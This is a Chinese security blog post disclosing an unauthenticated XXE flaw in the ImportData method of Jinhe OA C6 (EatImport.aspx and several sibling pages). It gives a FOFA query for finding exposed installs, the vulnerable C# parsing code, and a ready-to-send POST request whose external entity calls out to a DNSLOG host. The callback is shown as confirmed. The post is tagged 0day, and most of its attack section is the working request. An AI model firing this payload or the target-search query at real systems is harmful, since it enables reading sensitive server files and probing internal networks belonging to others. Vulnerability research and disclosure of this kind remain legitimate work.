---
title: "金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-EatImport-xxe.html
asset_dir: assets/金和oa-jhsoft.web.costcontrol.importing-importdata-多个xxe漏洞
---

# 金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/28 13:05
* 257浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

软件

授权

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `JHSoft.Web.CostControl.Importing` `ImportData` 方法处存在[XXE](https://mrxn.net/tag/XXE)漏洞被多个系统文件使用，如`EatImport.aspx`、`PoolListImport.aspx`、`RegionTypeListImport.aspx`、`SharingListImport.aspx`、`StayListImport.aspx`、`SubjectListImport.aspx`等，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

SQL注入防护

安全

技术文章订阅

[![金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞](images/img-001-c9f95b92e182.webp)](https://image.mrxn.net/5ee670e8dcf94803b81514f55368b2c8.webp)

直接看下使用的**ImportData**方法是如何实现的

网络安全

深入探索

代码安全审计

文件大小转换

VPN服务

```
protected string ImportData()
{
  string str = string.Empty;
  int num1 = 0;
  int num2 = 0;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlElement documentElement = xmlDocument.DocumentElement;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

其他几个页面`PoolListImport.aspx`、`RegionTypeListImport.aspx`、`SharingListImport.aspx`、`StayListImport.aspx`、`SubjectListImport.aspx`等都是同样的使用方法，就不一一复现了。

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/Importing/EatImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

漏洞预警服务

[![金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA JHSoft.Web.CostControl.Importing ImportData 多个XXE漏洞](https://mrxn.net/jswz/jhsoft-EatImport-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-EatImport-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-EatImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-EatImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 